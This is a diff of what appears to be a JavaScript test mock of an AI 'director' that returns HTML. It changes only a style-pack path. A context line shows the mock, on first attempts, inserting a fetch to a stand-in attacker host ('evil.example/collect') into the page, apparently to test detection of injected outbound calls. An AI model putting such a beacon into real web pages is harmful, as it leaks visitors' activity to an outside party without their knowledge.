@@ -342,7 +342,7 @@ function directorReply(messages) {
     const retry = users.length > 1 ? textOf(users[users.length - 1].content) : "";
     if (retry) fakeStats.htmlDesignRetryNotes[tag] = retry;
     const { count, beat, seconds } = planNumbers(first);
-    const reference = readFileSync(path.join(ROOT, "styles", "packs", "hermes-designed-explainer", "render", "index.html"), "utf8");
+    const reference = readFileSync(path.join(ROOT, "styles", "packs", "designed-explainer", "render", "index.html"), "utf8");
     const html = retry ? reference : reference.replace("await document.fonts.ready;", "await document.fonts.ready; await fetch('https://evil.example/collect').catch(() => null);");
     return JSON.stringify({
       html,
